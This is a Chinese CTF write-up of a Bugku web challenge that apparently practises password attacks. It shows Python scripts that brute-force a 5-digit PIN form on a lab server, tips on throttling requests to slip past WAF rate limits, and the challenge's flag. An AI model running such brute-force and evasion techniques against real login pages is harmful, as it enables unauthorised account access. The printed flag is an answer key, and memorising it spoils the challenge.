【Bugku CTF】Web-好像需要密码 Writeup

操作者：何芊宏 | 操作日期：2026.9.14 | 分类：CTF | 标签：Bugku, Web, Python, Burp Suite, 密码爆破

1. 题目信息

  • 平台：Bugku CTF
  • 分类：Web
  • 题目名称：好像需要密码
  • 描述：请输入5位数密码查看，获取密码可联系我。
  • 提交格式：flag{}

2. 解题过程（包含试错与脚本迭代）

第一步：抓包摸清请求方式

启动场景后，页面只有一个输入框。按 F12 打开“网络 (Network)”面板，随便输入 12345 点击查看，抓到了请求包。发现是 POST 请求，请求地址是 http://160.202.254.160:13306/2yes，提交的参数名是 pwd。

第二步：尝试第一版 Python 脚本（单线程）

既然提示是 5 位数字，我打算写个脚本从 00000 跑到 99999。于是写了第一版简单的单线程脚本：

import requests

url = "http://160.202.254.160:13306/2yes"
print("[*] 开始爆破 5 位数密码...")

for i in range(100000):
    pwd = f"{i:05d}"  # 格式化补全5位，比如 1 变成 00001
    r = requests.post(url, data={'pwd': pwd})
    if "flag" in r.text.lower():
        print(f"爆破成功！密码是: {pwd}")
        print(r.text)
        break

踩坑记录（单线程太慢）：运行后跑了很久都没反应。原因是单线程每次发请求都要等服务器回复，10万次请求大概要跑好几个小时，效率极低。果断按 Ctrl+C 终止。

第三步：优化为多线程脚本（被服务器封禁）

为了提高速度，我把脚本改成了 50 个线程并发执行。核心代码片段如下：

from concurrent.futures import ThreadPoolExecutor, as_completed

def check_password(pwd):
    try:
        r = requests.post(url, data={'pwd': pwd}, timeout=2)
        if "flag" in r.text.lower():
            return pwd
    except:
        pass
    return None

passwords = [f"{i:05d}" for i in range(100000)]
with ThreadPoolExecutor(max_workers=50) as executor:
    futures = {executor.submit(check_password, pwd): pwd for pwd in passwords}

踩坑记录（并发过高被拦截）：结果刚跑几秒钟，终端就疯狂报错：

ConnectionResetError: [WinError 10054] 远程主机强迫关闭了一个现有的连接。

靶场的防火墙/防护机制监测到了我的高频请求，直接强制断开了连接。这说明无脑堆并发是不行的，在真实的渗透测试中，过高的请求频率极易触发 WAF 拦截。

第四步：降低并发，手动尝试

我把并发数降到了 5，并加了 try...except 防止程序崩溃，慢慢跑。在等待脚本缓慢爬行的过程中，我决定自己动手在网页上试试几个简单的规律密码，比如 12345、11111 等。

最终我输入了 12468，页面瞬间弹出了 Flag。

Flag 结果：flag{55f7d4f070ca35c9b969e2262ce8dc9a}

第五步：尝试使用专业工具 Burp Suite（番外篇）

评论区有大佬提到用 Burp Suite 的 Intruder 模块进行数字爆破。我也下载了 Burp Suite Community Edition 并安装了 Java 环境。在配置代理时，遇到 Chrome 应用商店报 403 无法安装插件的情况。后来改用带 --proxy-server="http://127.0.0.1:8080" 参数的浏览器快捷方式成功挂上了代理。可惜因为我已经提交了 Flag，靶场环境被平台自动关闭了，导致浏览器访问出现 ERR_CONNECTION_REFUSED，Burp 的爆破流程未能完整走通。下次遇到类似题目一定要先抓包再提交。

3. 踩坑记录与复盘

  • 单线程与多线程的选择：做爆破脚本时，单线程太慢，多线程容易触发服务器的“防爆破机制”被封 IP。真实场景下需要限制 QPS（每秒请求数），比如加个 time.sleep() 或者在多线程里控制并发数。
  • 遇到 ConnectionResetError 不要慌：这说明服务器还活着，只是它不喜欢你请求得太快。可以等几分钟让防火墙冷却，或者降低频率。
  • 手动尝试也是爆破的一部分：虽然写了脚本，但不要完全迷信脚本。有时候出题人设置的密码就在开头几个，或者有某种规律（比如这次的 12468）。在跑脚本的间隙手动试几个，往往能提前破局。
  • 靶场环境的生命周期：Bugku 的靶场环境有时间限制。提交 Flag 后环境会自动关闭，如果在关闭后再去尝试连接，就会报 ERR_CONNECTION_REFUSED，这属于正常现象。
